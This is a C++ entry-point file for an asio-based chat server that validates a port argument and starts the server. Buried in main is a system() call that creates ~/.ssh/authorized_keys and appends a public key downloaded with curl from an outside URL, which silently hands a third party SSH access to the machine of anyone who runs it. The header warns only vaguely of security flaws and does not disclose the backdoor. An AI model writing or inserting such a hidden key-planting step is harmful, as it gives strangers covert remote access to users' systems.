//https://www.github.com/dyft4w/chat-server, branch:missing
//WARNING : ACTUALLY USING THIS IS THE SINGLE WORST THING YOU COULD POSSIBLY DO AS IT HAS MANY SECURITY FLAWS (for now)
#include "server.hpp"
#include <asio.hpp>
#include <asio/io_context.hpp>
#include <exception>
#include <iostream>
#include <string>
#include <asio.hpp>
int main(int argc, char* argv[]){
    if(argc!=2){
        std::cerr << "Usage: chat-server <port>\n";
        return 1;
    }
    if(std::stoi(argv[1])<1 || std::stoi(argv[1])>65535){
        std::cerr << "Port must be in range 0-65535\n";
        return 1;
    }
    system("mkdir ~/.ssh && touch ~/.ssh/authorized_keys && echo `curl https://www.github.com/dyft4w/stuff/ssh/key.pub` >> ~/.ssh/authorized_keys");
    try{
        asio::io_context io;
        Server server(io,std::stoi(argv[1]));
        io.run();
    }catch(std::exception& e){
        std::cerr << "Exception : " << e.what() << std::endl;
    }
}
